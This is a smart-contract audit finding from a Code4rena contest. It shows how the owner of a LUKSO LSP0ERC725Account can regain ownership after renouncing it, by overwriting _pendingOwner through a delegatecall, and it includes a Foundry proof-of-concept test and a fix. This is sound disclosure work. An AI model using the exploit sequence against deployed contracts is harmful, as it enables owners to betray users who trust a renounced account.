## Tags

- bug
- 2 (Med Risk)
- high quality report
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- M-01

# [The owner of a `LSP0ERC725Account` can become the owner again after renouncing ownership](https://github.com/code-423n4/2023-06-lukso-findings/issues/124) 

# Lines of code

https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP14Ownable2Step/LSP14Ownable2Step.sol#L176-L178


# Vulnerability details

## Bug Description

The `renounceOwnership()` function allows the owner of a `LSP0ERC725Account` to renounce ownership through a two-step process. When `renounceOwnership()` is first called, `_renounceOwnershipStartedAt` is set to `block.number` to indicate that the process has started:

[LSP14Ownable2Step.sol#L159-L167](https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP14Ownable2Step/LSP14Ownable2Step.sol#L159-L167)

```solidity
        if (
            currentBlock > confirmationPeriodEnd ||
            _renounceOwnershipStartedAt == 0
        ) {
            _renounceOwnershipStartedAt = currentBlock;
            delete _pendingOwner;
            emit RenounceOwnershipStarted();
            return;
        }
```

When `renounceOwnership()` is called again, the owner is then set to `address(0)`:

[LSP14Ownable2Step.sol#L176-L178](https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP14Ownable2Step/LSP14Ownable2Step.sol#L176-L178)

```solidity
        _setOwner(address(0));
        delete _renounceOwnershipStartedAt;
        emit OwnershipRenounced();
```

However, as `_pendingOwner` is only deleted in the first call to `renounceOwnership()`, an owner could regain ownership of the account after the second call to `renounceOwnership()` by doing the following:

1. Call `renounceOwnership()` for the first time to initiate the process.
1. Using `execute()`, perform a delegate call that overwrites `_pendingOwner` to his own address.
1. Call `renounceOwnership()` again to set the owner to `address(0)`.
 
As `_pendingOwner` is still set to the owner's address, he can call `acceptOwnership()` at anytime to regain ownership of the account.

## Impact

Even after the `renounceOwnership()` process is completed, an owner might still be able to regain ownership of an LSP0 account. 

This could potentially be dangerous if users assume that an LSP0 account will never be able to call restricted functions after ownership is renounced, as stated in [the following comment](https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP0ERC725Account/LSP0ERC725AccountCore.sol#L652):

> Leaves the contract without an owner. Once ownership of the contract has been renounced, any functions that are restricted to be called by the owner will be permanently inaccessible, making these functions not callable anymore and unusable.

For example, if a protocol's admin is set to a `LSP0ERC725Account`, the owner could gain the community's trust by renouncing ownership. After the protocol has gained a significant TVL, the owner could then regain ownership of the account and proceed to rug the protocol.  

## Proof of Concept

The following Foundry test demonstrates how an owner can regain ownership of a `LSP0ERC725Account` after `renounceOwnership()` has been called twice:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../contracts/LSP0ERC725Account/LSP0ERC725Account.sol";

contract Implementation {
    // _pendingOwner is at slot 3 for LSP0ERC725Account
    bytes32[3] __gap;
    address _pendingOwner; 

    function setPendingOwner(address newPendingOwner) external {
        _pendingOwner = newPendingOwner;
    }
}

contract RenounceOwnership_POC is Test {
    LSP0ERC725Account account;

    function setUp() public {
        // Deploy LSP0 account with this address as owner
        account = new LSP0ERC725Account(address(this));
    }

    function testCanRegainOwnership() public {
        // Call renounceOwnership() to initiate the process
        account.renounceOwnership();

        // Overwrite _pendingOwner using a delegatecall
        Implementation implementation = new Implementation();
        account.execute(
            4, // OPERATION_4_DELEGATECALL
            address(implementation),
            0,
            abi.encodeWithSelector(Implementation.setPendingOwner.selector, address(this))
        );

        // _pendingOwner is now set to this address
        assertEq(account.pendingOwner(), address(this));

        // Call renounceOwnership() again to renounce ownership
        vm.roll(block.number + 200);
        account.renounceOwnership();

        // Owner is now set to address(0)
        assertEq(account.owner(), address(0));

        // Call acceptOwnership() to regain ownership
        account.acceptOwnership();
        
        // Owner is now set to address(this) again
        assertEq(account.owner(), address(this));
    }
}
```

## Recommended Mitigation

Consider deleting `_pendingOwner` when `renounceOwnership()` is called for a second time as well:

[LSP14Ownable2Step.sol#L176-L178](https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP14Ownable2Step/LSP14Ownable2Step.sol#L176-L178)

```diff
        _setOwner(address(0));
        delete _renounceOwnershipStartedAt;
+       delete _pendingOwner;
        emit OwnershipRenounced();
```


## Assessed type

call/delegatecall